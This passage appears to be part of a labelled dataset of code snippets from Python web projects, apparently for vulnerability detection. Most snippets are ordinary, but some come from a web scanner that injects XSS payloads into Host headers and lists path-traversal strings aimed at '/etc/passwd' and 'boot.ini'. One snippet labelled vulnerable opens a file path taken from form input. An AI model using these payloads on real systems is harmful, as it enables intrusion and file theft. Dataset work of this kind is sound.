vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable", "label": 0}, {"snippet_id": 38503, "code": "\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document", "label": 0}, {"snippet_id": 30922, "code": ".getvalue('configver') \t\t\t \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>') \t\t \tfrom jinja2 import Environment, FileSystemLoader \tenv", "label": 1}, {"snippet_id": 12087, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 29940, "code": ")+'/keys/'+name+'.pem' \t \ttry: \t\twith open(ssh_keys, \"w\") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh", "label": 0}, {"snippet_id": 55165, "code": "(action_status['changed_entities'], locale) if action_status['latest_translation_pk']: Translation.objects.get( pk=action_status['latest_translation_pk'] ).update_latest_translation() update_translation_memory", "label": 0}, {"snippet_id": 24175, "code": ".join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls", "label": 0}, {"snippet_id": 22013, "code": "<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs", "label": 0}, {"snippet_id": 40662, "code": ".print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide ", "label": 0}, {"snippet_id": 46347, "code": " 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user), 'mobile': is_mobile }) def browse_m(request, name): return browse(request, name", "label": 0}, {"snippet_id": 12691, "code": "<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')", "label": 0}, {"snippet_id": 40270, "code": " value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value", "label": 0}, {"snippet_id": 282, "code": ".split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact", "label": 0}, {"snippet_id": 42663, "code": "(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus", "label": 0}, {"snippet_id": 6389, "code": ".config.get(self.section, 'static_dir') @property def ssl_adapter(self): \"\"\" CherryPy SSL adapter class to use(must be one of cherrypy.wsgiserver.ssl_adapters) \"\"\" return self.config.get(self.section, ", "label": 0}, {"snippet_id": 26924, "code": "]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params[hidden_param_name[i]]=hidden_param_value[i] if method.find", "label": 0}, {"snippet_id": 52048, "code": ".getLogger(__name__) def list_editor_workflows(request): workflows=[d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows", "label": 0}, {"snippet_id": 27640, "code": "-Security']=( 'max-age=2592000; includeSubdomains') self.response.headers['X-Content-Type-Options']='nosniff' self.response.headers['X-Frame-Options']='deny' def render(self, path, values=None, status=200", "label": 0}, {"snippet_id": 21505, "code": "]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name", "label": 0}, {"snippet_id": 3862, "code": " temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header)", "label": 0}, {"snippet_id": 17752, "code": " django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper", "label": 0}, {"snippet_id": 26654, "code": "%2e%2fetc%2fpasswd%00', '../../boot.ini', '../../../boot.ini', '../../../../boot.ini', '../../../../../boot.ini', '../../../../../../boot.ini', '../../../../../../../boot.ini', '../../../../../../../..", "label": 0}]